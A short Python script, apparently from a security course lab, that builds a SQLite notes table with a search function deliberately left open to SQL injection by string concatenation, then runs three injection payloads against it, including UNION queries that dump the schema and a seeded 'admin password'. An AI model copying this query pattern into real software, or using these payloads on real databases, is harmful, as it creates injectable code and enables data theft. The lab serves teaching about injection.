#!/usr/bin/env python3

import sqlite3
import os

DB_FILE = "notes.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute("CREATE TABLE IF NOT EXISTS notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT)")
    conn.execute(
        "INSERT OR IGNORE INTO notes (id, title, body) VALUES "
        "(1,'Welcome','This is your first note.'),"
        "(2,'Reminder','Submit the SSI lab report on time.'),"
        "(3,'Secret','The admin password is hunter2.')"
    )
    conn.commit()
    conn.close()

def search_notes_vuln(query):
    conn = sqlite3.connect(DB_FILE)
    sql = "SELECT id, title, body FROM notes WHERE title LIKE '%" + query + "%'"
    
    try:
        cursor = conn.execute(sql)
        results = cursor.fetchall()
        if results:
            for row in results:
                print(f"  [{row[0]}] {row[1]}: {row[2]}")
        else:
            print("  Nenhuma nota encontrada.")
    except sqlite3.Error as e:
        print(f"  Erro: {e}")
    conn.close()

if __name__ == "__main__":
    init_db()
    payloads = [
        ("Normal",    "Welcome"),
        ("Injeção 1", "' OR '1'='1"),
        ("Injeção 2", "' UNION SELECT 1, sql, '' FROM sqlite_master --"),
        ("Injeção 3", "' UNION SELECT 1, title, body FROM notes --"),
    ]
    for label, p in payloads:
        print(f"\n--- Teste {label}: {p!r} ---")
        search_notes_vuln(p)
